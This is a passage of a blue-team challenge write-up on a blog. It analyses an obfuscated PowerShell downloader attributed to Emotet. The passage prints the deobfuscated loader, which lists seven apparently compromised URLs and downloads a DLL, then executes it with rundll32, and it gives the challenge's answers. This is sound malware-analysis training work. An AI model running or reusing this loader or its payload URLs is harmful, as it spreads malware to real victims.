</span><span class="nv">$j16j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'n_0p'</span><span class="p">;</span><span class="w">
</span><span class="p">(</span><span class="n">dir</span><span class="w"> </span><span class="nx">variable:mku</span><span class="p">)</span><span class="o">.</span><span class="nf">value</span><span class="p">::</span><span class="s2">"createdirectory"</span><span class="p">(</span><span class="nv">$home</span><span class="w">  </span><span class="o">+</span><span class="w">  </span><span class="s1">'\db_bh30\yf5be5g\'</span><span class="p">);</span><span class="w">
</span><span class="nv">$c39y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'u68s'</span><span class="p">;</span><span class="w">
</span><span class="p">(</span><span class="n">variable</span><span class="p">(</span><span class="s2">"mbu"</span><span class="p">)</span><span class="w"> </span><span class="nt">-valueon</span><span class="p">)::</span><span class="s2">"securityprotocol"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'tls12'</span><span class="p">;</span><span class="w">
</span><span class="nv">$f35i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'i4_b'</span><span class="p">;</span><span class="w">
</span><span class="nv">$swrp6tc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'a69s'</span><span class="p">;</span><span class="w">
</span><span class="nv">$x27h</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'c33o'</span><span class="p">;</span><span class="w">
</span><span class="nv">$imd1yck</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$home</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\db_bh30\yf5be5g\a69s.dll'</span><span class="p">;</span><span class="w">
</span><span class="nv">$k47v</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'r49g'</span><span class="p">;</span><span class="w">
</span><span class="nv">$b9fhbyv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'https://admintk.com/wp-admin/l/'</span><span class="p">,</span><span class="s1">'https://mikegeerinck.com/c/yysa/'</span><span class="p">,</span><span class="s1">'http://freelancerwebdesignerhyderabad.com/cgi-bin/s/'</span><span class="p">,</span><span class="s1">'http://etdog.com/wp-content/nu/'</span><span class="p">,</span><span class="s1">'https://www.hintup.com.br/wp-content/de/'</span><span class="p">,</span><span class="s1">'http://www.stmarouns.nsw.edu.au/paypal/b8g/'</span><span class="p">,</span><span class="s1">'http://wm.mcdevelop.net/content/6f2gd/'</span><span class="w">
</span><span class="nv">$q52m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'p05k'</span><span class="p">;</span><span class="w">
</span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$bm5pw6z</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$b9fhbyv</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="s1">'new-object'</span><span class="p">)</span><span class="w"> </span><span class="n">system.net.webclient</span><span class="p">)</span><span class="o">.</span><span class="s2">"downloadfile"</span><span class="p">(</span><span class="nv">$bm5pw6z</span><span class="p">,</span><span class="w"> </span><span class="nv">$imd1yck</span><span class="p">);</span><span class="w">
        </span><span class="nv">$z10l</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="s1">'a92q'</span><span class="p">);</span><span class="w">
        </span><span class="kr">if</span><span class="w"> </span><span class="p">((</span><span class="o">&amp;</span><span class="p">(</span><span class="s1">'get-item'</span><span class="p">)</span><span class="w"> </span><span class="nv">$imd1yck</span><span class="p">)</span><span class="o">.</span><span class="s2">"length"</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">ge</span><span class="w"> </span><span class="nx">35698</span><span class="p">)</span><span class="w">  </span><span class="p">{</span><span class="w">
            </span><span class="o">&amp;</span><span class="p">(</span><span class="s1">'rundll32'</span><span class="p">)</span><span class="w"> </span><span class="nv">$imd1yck</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="s1">'control_rundll'</span><span class="p">)</span><span class="o">.</span><span class="s2">"tostring"</span><span class="p">();</span><span class="w">
            </span><span class="nv">$r65i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'z09b'</span><span class="p">;</span><span class="w">
            </span><span class="kr">break</span><span class="p">;</span><span class="w">
            </span><span class="nv">$k7_h</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'f12u'</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w"> </span><span class="kr">catch</span><span class="w"> </span><span class="p">{}</span><span class="w">

</span><span class="p">}</span><span class="w">
</span><span class="nv">$w54i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'v95o'</span><span class="w">
</span></pre></table></code></div></div><h1 id="determening-malware">Determening Malware</h1><p>Simple google search point as to MalwareBazaar</p><p><img data-src="/assets/images/2022-05-20-15-42-03.png" alt="" data-proofer-ignore></p><p>If we check inteligence data we see it’s probably related to Emotet Family</p><p><img data-src="/assets/images/2022-05-20-15-43-34.png" alt="" data-proofer-ignore></p><h1 id="answering-questions">Answering Questions</h1><p>Please note that i’ve used <code class="language-plaintext highlighter-rouge">ToLowerCase</code> function and as this helps with readability, it also impacts file and directory names!</p><blockquote><p>What security protocol is being used for the communication with a malicious domain? TLS 1.2</p></blockquote><blockquote><p>What directory does the obfuscated PowerShell create? (Starting from \HOME) \home\db_bh30\yf5be5g\</p></blockquote><blockquote><p>What file is being downloaded (full name)? a69s.dll</p></blockquote><blockquote><p>What is used to execute the downloaded file? rundll32</p></blockquote><blockquote><p>What is the domain name of the URI ending in ‘/6F2gd/’? wm.mcdevelop.net</p></blockquote><blockquote><p>Based on the analysis of the obfuscated code, what is the name of the malware? Emotet</p></blockquote><h1 id="reference">Reference</h1><p>https://malware.news/t/deobfuscating-powershell-putting-the-toothpaste-back-in-the-tube/23509</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/blueteamlabs/'>BlueTeamLabs</a>, <a href='/categories/incident-response/'>Incident Response</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/powershell/" class="post-tag no-text-decoration" >PowerShell</a> <a href="/tags/cyberchef/" class="post-tag no-text-decoration" >CyberChef</a> <a href="/tags/malware/" class="post-tag no-text-decoration" >Malware</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=(BTLO/Challenge) - Malicious PowerShell Analysis - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/Malicious_PowerShell_Analysis/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=(BTLO/Challenge) - Malicious PowerShell Analysis - CyberSec-Research.Space&u=https://an9k0r.github.io/posts/Malicious_PowerShell_Analysis/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=(BTLO/Challenge) - Malicious PowerShell Analysis - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/Malicious_PowerShell_Analysis/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/insecure_deserialization/">(Portswigger/WebAcademy) - Insecure Deserialization vulnerabilities</a><li><a href="/posts/ssti/">(Portswigger/WebAcademy) - Server-Side Template Injection vulnerabilities</a><li><a href="/posts/stored_XSS/">(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</a><li><a href="/posts/Blind_SQL_Injection/">Blind SQL Injection</a><li><a href="/posts/OS_Command_Injection/">OS Command Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Pretium/"><div class="card-body"> <em class="timeago small" date="2022-04-08 18:33:00 +0200" >Apr 8, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(BTLO/Investigation) - Pretium</h3><div class="text-muted small"><p> The Security Operations Center at Defense Superior are monitoring a customer’s email gateway and network traffic (Crimeson LLC). CTF is hosted on https://blueteamlabs.online/ Scenario ...</p></div></div></a></div><div class="card"> <a href="/posts/Miner/"><div class="card-body"> <em class="timeago small" date="2022-04-08 18:33:00 +0200" >Apr 8, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Miner</h3><div class="text-muted small"><p> Our detection team reported that they receive an IDS alert related to reconnaissance but they were unable to read the traffic as it was encrypted. Pcap files and analysis tools are available on the...</p></div></div></a></div><div class="card"> <a href="/posts/Total_Recall/"><div class="card-body"> <em class="timeago small" date="2022-05-22 18:33:00 +0200" >May 22, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(BTLO/Investigation) - Total Recall</h3><div class="text-muted small"><p> Microsoft Defender Antivirus has been there for over a decade now. It provides security against known threats until it has not been tampered with. CTF is hosted on https://blueteamlabs.online/ ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Defaced/" class="btn btn-outline-primary" prompt="Older"><p>(BTLO/Security Operations) - Defaced</p></a> <a href="/posts/Total_Recall/" class="btn btn-outline-primary" prompt="Newer"><p>(BTLO/Investigation) - Total Recall</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/cybersec_space">eng4ge</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script>
